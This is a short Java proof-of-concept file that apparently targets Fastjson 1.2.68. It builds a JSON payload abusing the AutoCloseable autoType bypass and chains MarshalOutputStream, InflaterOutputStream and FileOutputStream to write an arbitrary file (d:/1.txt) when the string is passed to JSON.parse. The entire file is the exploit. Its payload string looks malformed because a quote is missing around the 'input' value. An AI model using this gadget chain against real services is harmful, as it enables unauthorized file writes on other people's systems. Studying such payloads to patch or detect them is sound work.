package com.firebasky.fastjson.poc1268;

import com.alibaba.fastjson.JSON;

public class write_1 {
    public static void main(String[] args) {
        String poc ="{'@type':\"java.lang.AutoCloseable\",'@type':'sun.rmi.server.MarshalOutputStream','out':{'@type':'java.util.zip.InflaterOutputStream','out':{'@type':'java.io.FileOutputStream','file':'d:/1.txt','append':false},'infl':{'input':'111111},'bufLen':1048576},'protocolVersion':1}";
        Object parse = JSON.parse(poc);
        System.out.println(parse);
    }
}
